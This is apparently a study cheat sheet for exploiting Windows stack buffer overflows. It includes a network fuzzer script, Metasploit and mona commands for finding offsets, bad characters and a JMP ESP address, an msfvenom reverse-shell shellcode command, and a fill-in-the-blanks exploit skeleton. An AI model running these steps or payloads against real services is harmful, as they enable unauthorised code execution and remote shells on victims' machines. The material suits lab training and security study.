# Buffer Overflow

## Fuzzers

{% embed url="https://github.com/AceSineX/BOF-fuzzer-python-3-All-in" %}

```python
#!/usr/bin/python3

import sys, socket
from time import sleep

buffer = "A" * 100
prefix = ""
while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.49.177',7138))

        payload = prefix + buffer
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100

    except:
        print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
    
```

## Steps

* Fuzz and crash program w/ A's
* Create msfpattern

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```

* Provide EIP to find offset

```
!mona findmsp -distance 600
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q (EIP value)
```

* Check for bad characters

```
!mona config -set workingfolder c:\mona\%p 
!mona bytearray -cpb "\x00"
!mona compare -f c:\mona\nameOfProgram\bytearray.bin -a ESP-Address
```

* Find JMP ESP/Return Address
  * make sure protection schemes are off and base address doesn't contain bad chars

```
!mona jmp -r ESP
```

* Generate Shellcode

{% code overflow="wrap" %}
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00"
```
{% endcode %}

* Exploit!

## Exploit.py

```python
import socket

ip = "192.168.0.1"
port = 9999

prefix = ""
offset = ""
overflow = "A" * offset
retn = "" # JMP ESP/Return Address
padding = "" # "\x90" * 16 # nops
payload = ()
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```
